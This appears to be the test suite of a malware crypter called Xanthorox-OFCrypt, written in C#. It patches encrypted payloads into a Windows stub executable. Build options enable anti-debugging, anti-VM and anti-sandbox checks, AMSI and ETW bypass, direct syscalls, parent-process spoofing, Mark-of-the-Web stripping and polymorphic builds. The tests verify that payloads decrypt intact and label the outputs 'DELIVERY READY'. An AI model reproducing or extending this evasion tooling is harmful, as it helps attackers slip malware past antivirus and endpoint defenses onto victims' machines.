                    else Fail($"Integration [{cipherName}]: Cannot locate config data (key at {kOff})");

                    Assert($"Integration [{cipherName}]: Binary size >= stub ({patched.Length:N0} >= {originalStub.Length:N0})",
                        patched.Length >= originalStub.Length);

                    Info($"Integration [{cipherName}]: OK — {patched.Length:N0} bytes");
                }
                catch (Exception ex) { Fail($"Integration [{cipherName}]: EXCEPTION — {ex.Message}"); }
                finally { try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch { } }
            }

            // ═══ TEST ALL 4 RESEARCH PACKAGES ═══
            var researchPkgs = new[]
            {
                ("Ghost Protocol", 1, new Func<(byte[] enc, byte[] prm)>(() => {
                    var (e, p) = GhostProtocol.Encrypt(payload, masterKey);
                    return (e, GhostProtocol.SerializeParams(p));
                })),
                ("Neuromancer", 2, new Func<(byte[] enc, byte[] prm)>(() => {
                    var (e, p) = Neuromancer.Encrypt(payload, masterKey);
                    return (e, Neuromancer.SerializeParams(p));
                })),
                ("Darknet Cipher", 3, new Func<(byte[] enc, byte[] prm)>(() => {
                    var (e, p) = DarknetCipher.Encrypt(payload, masterKey);
                    return (e, DarknetCipher.SerializeParams(p));
                })),
                ("VOID WALKER", 4, new Func<(byte[] enc, byte[] prm)>(() => {
                    var (e, p) = VoidWalker.Encrypt(payload, masterKey);
                    return (e, VoidWalker.SerializeParams(p));
                })),
            };

            foreach (var (pkgName, pkgId, encFunc) in researchPkgs)
            {
                string safe = pkgName.Replace(" ", "_");
                string outputPath = Path.Combine(tempDir, $"integration_{safe}.exe");
                try
                {
                    var (encrypted, researchParams) = encFunc();

                    var config = new BuildConfig
                    {
                        AntiDebug = true, AntiVM = true, Syscalls = true, PhantomDLL = true,
                        EncAlgorithm = 0, ResearchPackage = (byte)pkgId
                    };

                    string buildResult = StubPatcher.Build(stubPath, outputPath, encrypted, masterKey, config, researchParams);
                    Assert($"Integration [{pkgName}]: Build succeeded", string.IsNullOrEmpty(buildResult));

                    if (!File.Exists(outputPath)) { Fail($"Integration [{pkgName}]: Output not created"); continue; }

                    byte[] patched = File.ReadAllBytes(outputPath);

                    Assert($"Integration [{pkgName}]: Valid PE (MZ)", patched.Length > 2 && patched[0] == 'M' && patched[1] == 'Z');

                    // Verify encrypted payload embedded
                    byte[] encSig = encrypted.Length >= 32 ? encrypted[..32] : encrypted;
                    Assert($"Integration [{pkgName}]: Encrypted payload found", FindMarker(patched, encSig) >= 0);

                    // Verify key embedded
                    Assert($"Integration [{pkgName}]: Master key embedded", FindMarker(patched, masterKey) >= 0);

                    // Verify research params — exact byte match at known offset
                    if (stubResearchData >= 0 && stubResearchData + researchParams.Length <= patched.Length)
                    {
                        bool resExact = true;
                        int badIdx = -1;
                        for (int i = 0; i < researchParams.Length; i++)
                        {
                            if (patched[stubResearchData + i] != researchParams[i])
                            {
                                resExact = false;
                                badIdx = i;
                                break;
                            }
                        }
                        Assert($"Integration [{pkgName}]: Research params exact match at offset {stubResearchData} ({researchParams.Length} bytes)", resExact);
                        if (!resExact)
                            Info($"  → Mismatch at byte {badIdx}: expected 0x{researchParams[badIdx]:X2}, got 0x{patched[stubResearchData + badIdx]:X2}");

                        // Verify size prefix
                        uint storedSize = BitConverter.ToUInt32(patched, stubResearchData - 4);
                        Assert($"Integration [{pkgName}]: Research size prefix = {researchParams.Length} (stored {storedSize})",
                            storedSize == (uint)researchParams.Length);
                    }
                    else
                    {
                        Skip($"Integration [{pkgName}]: XRESRC offset not found in unpatched stub");
                    }

                    // Verify config using key-relative offset
                    int kOff = FindMarker(patched, masterKey);
                    if (kOff >= 40)
                    {
                        int cfgData = kOff - 40;
                        Assert($"Integration [{pkgName}]: ResearchPackage={pkgId} in config", patched[cfgData + 24] == (byte)pkgId);
                        Assert($"Integration [{pkgName}]: Syscalls flag set",    patched[cfgData + 14] == 1);
                        Assert($"Integration [{pkgName}]: PhantomDLL flag set",  patched[cfgData + 18] == 1);
                    }
                    else Fail($"Integration [{pkgName}]: Cannot locate config data");

                    Info($"Integration [{pkgName}]: OK — {patched.Length:N0} bytes, params={researchParams.Length}");
                }
                catch (Exception ex) { Fail($"Integration [{pkgName}]: EXCEPTION — {ex.Message}"); }
                finally { try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch { } }
            }

            // ═══ FULL PIPELINE: Entropy Norm → Encrypt → Patch ═══
            {
                string outputPath = Path.Combine(tempDir, "integration_full_pipeline.exe");
                try
                {
                    byte[] normalized = EntropyNorm.Encode(payload);
                    Assert("Integration [FullPipeline]: Entropy norm applied", normalized.Length == payload.Length + 1);

                    byte[] encrypted = CryptoEngine.Encrypt(normalized, masterKey, CipherType.AES256);
                    Assert("Integration [FullPipeline]: AES encryption applied", encrypted.Length > normalized.Length);

                    var config = new BuildConfig
                    {
                        AntiDebug = true, AntiVM = true, AntiSandbox = true,
                        AMSI = true, ETW = true, SleepObf = true,
                        Syscalls = true, GuardPage = true, EntropyNorm = true,
                        EncAlgorithm = 0, ResearchPackage = 0
                    };

                    string buildResult = StubPatcher.Build(stubPath, outputPath, encrypted, masterKey, config);
                    Assert("Integration [FullPipeline]: Build succeeded", string.IsNullOrEmpty(buildResult));

                    if (File.Exists(outputPath))
                    {
                        byte[] patched = File.ReadAllBytes(outputPath);
                        Assert("Integration [FullPipeline]: Valid PE", patched[0] == 'M' && patched[1] == 'Z');

                        // Verify payload — exact byte match at known offset
                        if (stubPayloadData >= 0 && stubPayloadData + 32 <= patched.Length)
                        {
                            bool payExact = true;
                            for (int i = 0; i < 32; i++)
                                if (patched[stubPayloadData + i] != encrypted[i]) { payExact = false; break; }
                            Assert("Integration [FullPipeline]: Encrypted payload exact match", payExact);
                        }
                        else
                        {
                            Assert("Integration [FullPipeline]: Encrypted payload embedded", FindMarker(patched, encrypted[..32]) >= 0);
                        }

                        // Verify config using key-relative offset
                        int kOff = FindMarker(patched, masterKey);
                        if (kOff >= 40)
                        {
                            int cfgData = kOff - 40;
                            Assert("Integration [FullPipeline]: EntropyNorm flag set", patched[cfgData + 13] == 1);
                        }

                        Info($"Integration [FullPipeline]: {payload.Length:N0} → norm {normalized.Length:N0} → enc {encrypted.Length:N0} → binary {patched.Length:N0}");
                    }
                }
                catch (Exception ex) { Fail($"Integration [FullPipeline]: EXCEPTION — {ex.Message}"); }
                finally { try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch { } }
            }
        }
        finally
        {
            try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); } catch { }
        }
    }

    // ═══════════════════════════════════════════
    //  SECTION 9: PENTEST DELIVERY SIMULATION
    //  Full build-verify-decrypt pipeline for
    //  every cipher and research package.
    // ═══════════════════════════════════════════
    static void TestPentestDelivery(byte[] payload, byte[] masterKey, string stubPath)
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine();
        Console.WriteLine("─── PENTEST DELIVERY SIMULATION (Full Pipeline Verification) ───");
        Console.ResetColor();

        if (!File.Exists(stubPath)) { Skip("Pentest: Stub.exe not found"); return; }

        string tempDir = Path.Combine(Path.GetTempPath(), "xanthorox_pentest_sim");
        if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);

        byte[] originalStub = File.ReadAllBytes(stubPath);

        // Pre-compute known offsets from unpatched stub
        int stubPayloadData = -1;
        int payMrk = FindMarker(originalStub, Encoding.ASCII.GetBytes("XPAYLOD"));
        if (payMrk >= 0) stubPayloadData = payMrk + 8 + 4;
        int stubResearchData = -1;
        int resMrk = FindMarker(originalStub, Encoding.ASCII.GetBytes("XRESRC\0"));
        if (resMrk >= 0) stubResearchData = resMrk + 8 + 4;

        try
        {
            // ── Scenario 1: AES-256 + All protections ──
            {
                string tag = "Pentest-AES-Full";
                string outPath = Path.Combine(tempDir, $"{tag}.exe");
                try
                {
                    byte[] key = new byte[32];
                    using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create()) rng.GetBytes(key);

                    byte[] normalized = EntropyNorm.Encode(payload);
                    byte[] encrypted = CryptoEngine.Encrypt(normalized, key, CipherType.AES256);

                    var config = new BuildConfig
                    {
                        AntiDebug = true, AntiVM = true, AntiSandbox = true,
                        AMSI = true, ETW = true, SleepObf = true, PPIDSpoof = true,
                        EntropyNorm = true, Syscalls = true, GuardPage = true,
                        PhantomDLL = true, AntiEmulation = true, MotwStrip = true,
                        EncAlgorithm = 0, ResearchPackage = 0
                    };

                    string err = StubPatcher.Build(stubPath, outPath, encrypted, key, config);
                    Assert($"{tag}: Build succeeded", string.IsNullOrEmpty(err));

                    byte[] binary = File.ReadAllBytes(outPath);
                    Assert($"{tag}: Valid PE", binary[0] == 'M' && binary[1] == 'Z');

                    // Exact key match
                    int kOff = FindMarker(binary, key);
                    Assert($"{tag}: Key exact match", kOff >= 0);

                    // Exact payload match
                    if (stubPayloadData >= 0)
                    {
                        bool payExact = true;
                        for (int i = 0; i < Math.Min(64, encrypted.Length); i++)
                            if (binary[stubPayloadData + i] != encrypted[i]) { payExact = false; break; }
                        Assert($"{tag}: Payload exact match", payExact);
                    }

                    // Full config verification
                    if (kOff >= 40)
                    {
                        int cfgData = kOff - 40;
                        byte[] cfgBytes = config.ToBytes();
                        bool cfgExact = true;
                        for (int i = 0; i < 32; i++)
                            if (binary[cfgData + i] != cfgBytes[i]) { cfgExact = false; break; }
                        Assert($"{tag}: Config 32-byte exact match", cfgExact);
                    }

                    // Decrypt roundtrip: extract encrypted payload → decrypt → decode entropy → compare
                    if (stubPayloadData >= 0)
                    {
                        byte[] extractedEnc = new byte[encrypted.Length];
                        Array.Copy(binary, stubPayloadData, extractedEnc, 0, encrypted.Length);
                        Assert($"{tag}: Extracted payload matches encrypted", extractedEnc.SequenceEqual(encrypted));

                        // AES decrypt
                        byte[] iv = extractedEnc[..16];
                        byte[] ciphertext = extractedEnc[16..];
                        using var aes = System.Security.Cryptography.Aes.Create();
                        aes.KeySize = 256;
                        aes.Mode = System.Security.Cryptography.CipherMode.CBC;
                        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                        aes.Key = key;
                        aes.IV = iv;
                        using var dec = aes.CreateDecryptor();
                        byte[] decrypted = dec.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                        Assert($"{tag}: Decrypted size matches normalized", decrypted.Length == normalized.Length);

                        byte[] original = EntropyNorm.Decode(decrypted);
                        Assert($"{tag}: FULL ROUNDTRIP — original payload recovered ({original.Length} bytes)",
                            original.SequenceEqual(payload));
                    }

                    Info($"{tag}: DELIVERY READY — {binary.Length:N0} bytes");
                }
                catch (Exception ex) { Fail($"{tag}: EXCEPTION — {ex.Message}"); }
                finally { try { if (File.Exists(outPath)) File.Delete(outPath); } catch { } }
            }

            // ── Scenario 2: ChaCha20 (stream cipher self-inverse) ──
            {
                string tag = "Pentest-ChaCha20";
                string outPath = Path.Combine(tempDir, $"{tag}.exe");
                try
                {
                    byte[] key = new byte[32];
                    using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create()) rng.GetBytes(key);

                    byte[] encrypted = CryptoEngine.Encrypt(payload, key, CipherType.ChaCha20);

                    var config = new BuildConfig
                    {
                        AntiDebug = true, AntiVM = true, AMSI = true, ETW = true,
                        EncAlgorithm = 1, ResearchPackage = 0
                    };

                    string err = StubPatcher.Build(stubPath, outPath, encrypted, key, config);
                    Assert($"{tag}: Build succeeded", string.IsNullOrEmpty(err));

                    byte[] binary = File.ReadAllBytes(outPath);
                    Assert($"{tag}: Valid PE", binary[0] == 'M' && binary[1] == 'Z');

                    int kOff = FindMarker(binary, key);
                    Assert($"{tag}: Key exact match", kOff >= 0);

                    // ChaCha20 is self-inverse; Encrypt(Encrypt(x)) == x
                    if (stubPayloadData >= 0)
                    {
                        byte[] extractedEnc = new byte[encrypted.Length];
                        Array.Copy(binary, stubPayloadData, extractedEnc, 0, encrypted.Length);
                        byte[] decrypted = CryptoEngine.Encrypt(extractedEnc, key, CipherType.ChaCha20);
                        Assert($"{tag}: FULL ROUNDTRIP — self-inverse decrypt ({decrypted.Length} bytes)",
                            decrypted.SequenceEqual(payload));
                    }

                    Info($"{tag}: DELIVERY READY — {binary.Length:N0} bytes");
                }
                catch (Exception ex) { Fail($"{tag}: EXCEPTION — {ex.Message}"); }
                finally { try { if (File.Exists(outPath)) File.Delete(outPath); } catch { } }
            }

            // ── Scenario 3: Ghost Protocol research package ──
            {
                string tag = "Pentest-GhostProto";
                string outPath = Path.Combine(tempDir, $"{tag}.exe");
                try
                {
                    byte[] key = new byte[32];
                    using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create()) rng.GetBytes(key);

                    var (encrypted, gp) = GhostProtocol.Encrypt(payload, key);
                    byte[] researchParams = GhostProtocol.SerializeParams(gp);

                    var config = new BuildConfig
                    {
                        AntiDebug = true, AntiVM = true, Syscalls = true, PhantomDLL = true,
                        EncAlgorithm = 0, ResearchPackage = 1
                    };

                    string err = StubPatcher.Build(stubPath, outPath, encrypted, key, config, researchParams);
                    Assert($"{tag}: Build succeeded", string.IsNullOrEmpty(err));

                    byte[] binary = File.ReadAllBytes(outPath);
                    Assert($"{tag}: Valid PE", binary[0] == 'M' && binary[1] == 'Z');

                    // Exact key match
                    Assert($"{tag}: Key exact match", FindMarker(binary, key) >= 0);

                    // Exact payload match
                    if (stubPayloadData >= 0)
                    {
                        bool payExact = true;
                        for (int i = 0; i < Math.Min(64, encrypted.Length); i++)
                            if (binary[stubPayloadData + i] != encrypted[i]) { payExact = false; break; }
                        Assert($"{tag}: Payload exact match", payExact);
                    }

                    // Exact research params match
                    if (stubResearchData >= 0 && stubResearchData + researchParams.Length <= binary.Length)
                    {
                        bool resExact = true;
                        for (int i = 0; i < researchParams.Length; i++)
                            if (binary[stubResearchData + i] != researchParams[i]) { resExact = false; break; }
                        Assert($"{tag}: Research params exact match ({researchParams.Length} bytes)", resExact);

                        uint storedSz = BitConverter.ToUInt32(binary, stubResearchData - 4);
                        Assert($"{tag}: Research size prefix = {researchParams.Length}", storedSz == (uint)researchParams.Length);
                    }

                    // Full config match
                    int kOff = FindMarker(binary, key);
                    if (kOff >= 40)
                    {
                        int cfgData = kOff - 40;
                        byte[] cfgBytes = config.ToBytes();
                        bool cfgExact = true;
                        for (int i = 0; i < 32; i++)
                            if (binary[cfgData + i] != cfgBytes[i]) { cfgExact = false; break; }
                        Assert($"{tag}: Config exact match", cfgExact);
                    }

                    Info($"{tag}: DELIVERY READY — {binary.Length:N0} bytes, params={researchParams.Length}");
                }
                catch (Exception ex) { Fail($"{tag}: EXCEPTION — {ex.Message}"); }
                finally { try { if (File.Exists(outPath)) File.Delete(outPath); } catch { } }
            }

            // ── Scenario 4: Darknet Cipher (largest params at 4236 bytes) ──
            {
                string tag = "Pentest-DarknetCipher";
                string outPath = Path.Combine(tempDir, $"{tag}.exe");
                try
                {
                    byte[] key = new byte[32];
                    using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create()) rng.GetBytes(key);

                    var (encrypted, dp) = DarknetCipher.Encrypt(payload, key);
                    byte[] researchParams = DarknetCipher.SerializeParams(dp);

                    var config = new BuildConfig
                    {
                        AntiDebug = true, AntiVM = true, Syscalls = true, GuardPage = true,
                        EncAlgorithm = 0, ResearchPackage = 3
                    };

                    string err = StubPatcher.Build(stubPath, outPath, encrypted, key, config, researchParams);
                    Assert($"{tag}: Build succeeded", string.IsNullOrEmpty(err));

                    byte[] binary = File.ReadAllBytes(outPath);
                    Assert($"{tag}: Valid PE", binary[0] == 'M' && binary[1] == 'Z');
                    Assert($"{tag}: Key exact match", FindMarker(binary, key) >= 0);

                    // Exact research params match (4236 bytes — largest package)
                    if (stubResearchData >= 0 && stubResearchData + researchParams.Length <= binary.Length)
                    {
                        bool resExact = true;
                        for (int i = 0; i < researchParams.Length; i++)
                            if (binary[stubResearchData + i] != researchParams[i]) { resExact = false; break; }
                        Assert($"{tag}: Research params exact match ({researchParams.Length} bytes)", resExact);

                        uint storedSz = BitConverter.ToUInt32(binary, stubResearchData - 4);
                        Assert($"{tag}: Research size prefix = {researchParams.Length}", storedSz == (uint)researchParams.Length);
                    }

                    Info($"{tag}: DELIVERY READY — {binary.Length:N0} bytes, params={researchParams.Length}");
                }
                catch (Exception ex) { Fail($"{tag}: EXCEPTION — {ex.Message}"); }
                finally { try { if (File.Exists(outPath)) File.Delete(outPath); } catch { } }
            }

            // ── Scenario 5: RC4 + XOR back-to-back (multiple builds from same stub) ──
            {
                string tag = "Pentest-MultiCipher";
                string outPath1 = Path.Combine(tempDir, $"{tag}_rc4.exe");
                string outPath2 = Path.Combine(tempDir, $"{tag}_xor.exe");
                try
                {
                    byte[] key = new byte[32];
                    using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create()) rng.GetBytes(key);

                    byte[] encRC4 = CryptoEngine.Encrypt(payload, key, CipherType.RC4);
                    byte[] encXOR = CryptoEngine.Encrypt(payload, key, CipherType.XOR);

                    var cfgRC4 = new BuildConfig { AntiDebug = true, AMSI = true, EncAlgorithm = 2 };
                    var cfgXOR = new BuildConfig { AntiDebug = true, AMSI = true, EncAlgorithm = 3 };

                    string err1 = StubPatcher.Build(stubPath, outPath1, encRC4, key, cfgRC4);
                    string err2 = StubPatcher.Build(stubPath, outPath2, encXOR, key, cfgXOR);

                    Assert($"{tag}: RC4 build succeeded", string.IsNullOrEmpty(err1));
                    Assert($"{tag}: XOR build succeeded", string.IsNullOrEmpty(err2));

                    byte[] bin1 = File.ReadAllBytes(outPath1);
                    byte[] bin2 = File.ReadAllBytes(outPath2);

                    Assert($"{tag}: RC4 valid PE", bin1[0] == 'M' && bin1[1] == 'Z');
                    Assert($"{tag}: XOR valid PE", bin2[0] == 'M' && bin2[1] == 'Z');

                    // Verify binaries are structurally different (mutations are random each build)
                    bool differ = false;
                    for (int i = 0; i < Math.Min(bin1.Length, bin2.Length); i++)
                        if (bin1[i] != bin2[i]) { differ = true; break; }
                    Assert($"{tag}: Two builds are polymorphic (different bytes)", differ);

                    // Verify both keys are intact
                    Assert($"{tag}: RC4 key intact", FindMarker(bin1, key) >= 0);
                    Assert($"{tag}: XOR key intact", FindMarker(bin2, key) >= 0);

                    // RC4 self-inverse roundtrip from binary
                    if (stubPayloadData >= 0)
                    {
                        byte[] extractedRC4 = new byte[encRC4.Length];
                        Array.Copy(bin1, stubPayloadData, extractedRC4, 0, encRC4.Length);
                        byte[] decRC4 = CryptoEngine.Encrypt(extractedRC4, key, CipherType.RC4);
                        Assert($"{tag}: RC4 FULL ROUNDTRIP", decRC4.SequenceEqual(payload));

                        byte[] extractedXOR = new byte[encXOR.Length];
                        Array.Copy(bin2, stubPayloadData, extractedXOR, 0, encXOR.Length);
                        byte[] decXOR = CryptoEngine.Encrypt(extractedXOR, key, CipherType.XOR);
                        Assert($"{tag}: XOR FULL ROUNDTRIP", decXOR.SequenceEqual(payload));
                    }

                    Info($"{tag}: DELIVERY READY — RC4={bin1.Length:N0}, XOR={bin2.Length:N0}");
                }
                catch (Exception ex) { Fail($"{tag}: EXCEPTION — {ex.Message}"); }
                finally
                {
                    try { if (File.Exists(outPath1)) File.Delete(outPath1); } catch { }
                    try { if (File.Exists(outPath2)) File.Delete(outPath2); } catch { }
                }
            }
        }
        finally
        {
            try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); } catch { }
        }
    }

    // ═══════════════════════════════════════════
    //  HELPERS
    // ═══════════════════════════════════════════

    static void Assert(string test, bool condition)
    {
        if (condition)
        {
            _passed++;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("  ✓ PASS  ");
        }
        else
        {
            _failed++;
            _failures.Add(test);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("  ✗ FAIL  ");
        }
        Console.ResetColor();
        Console.WriteLine(test);
    }

    static void Fail(string test)
    {
        _failed++;
        _failures.Add(test);
        Console.ForegroundColor = ConsoleColor.Red;
        Console.Write("  ✗ FAIL  ");
        Console.ResetColor();
        Console.WriteLine(test);
    }

    static void Skip(string test)
    {
        _skipped++;
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.Write("  ○ SKIP  ");
        Console.ResetColor();
        Console.WriteLine(test);
    }

    static void Info(string msg)
    {
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.WriteLine($"  ℹ {msg}");
        Console.ResetColor();
    }

    static void Section(string name)
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine($"─── {name} ───");
        Console.ResetColor();
    }

    static double CalculateEntropy(byte[] data)
    {
        if (data.Length == 0) return 0;
        int[] freq = new int[256];
        foreach (byte b in data) freq[b]++;
        double entropy = 0;
        double len = data.Length;
        for (int i = 0; i < 256; i++)
        {
            if (freq[i] == 0) continue;
            double p = freq[i] / len;
            entropy -= p * Math.Log2(p);
        }
        return entropy;
    }

    static byte[] PadKey(byte[] key, int target)
    {
        byte[] result = new byte[target];
        Array.Copy(key, result, Math.Min(key.Length, target));
        return result;
    }

    static int FindMarker(byte[] data, byte[] marker)
    {
        for (int i = 0; i <= data.Length - marker.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < marker.Length; j++)
            {
                if (data[i + j] != marker[j]) { found = false; break; }
            }
            if (found) return i;
        }
        return -1;
    }

    static byte[] GenerateSyntheticPE(int size)
    {
        byte[] pe = new byte[size];
        RandomNumberGenerator.Fill(pe);
        pe[0] = (byte)'M'; pe[1] = (byte)'Z'; // MZ header
        pe[0x3C] = 0x80; // PE header offset
        pe[0x80] = (byte)'P'; pe[0x81] = (byte)'E'; pe[0x82] = 0; pe[0x83] = 0;
        return pe;
    }

    static void WriteReport(string payloadPath)
    {
        string reportPath = Path.Combine(AppContext.BaseDirectory, "test_report.txt");
        try
        {
            using var sw = new StreamWriter(reportPath);
            sw.WriteLine("═══════════════════════════════════════════════════");
            sw.WriteLine(" XANTHOROX-OFCRYPT TEST REPORT");
            sw.WriteLine($" Date: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            sw.WriteLine($" Payload: {payloadPath}");
            sw.WriteLine("═══════════════════════════════════════════════════");
            sw.WriteLine($" PASSED:  {_passed}");
            sw.WriteLine($" FAILED:  {_failed}");
            sw.WriteLine($" SKIPPED: {_skipped}");
            sw.WriteLine($" TOTAL:   {_passed + _failed + _skipped}");
            sw.WriteLine("═══════════════════════════════════════════════════");
            if (_failures.Count > 0)
            {
                sw.WriteLine("\nFAILED TESTS:");
                foreach (var f in _failures)
                    sw.WriteLine($"  ✗ {f}");
            }
            else
            {
                sw.WriteLine("\n ALL TESTS PASSED ✓");
            }
            Info($"Report written to: {reportPath}");
        }
        catch { }
    }
}
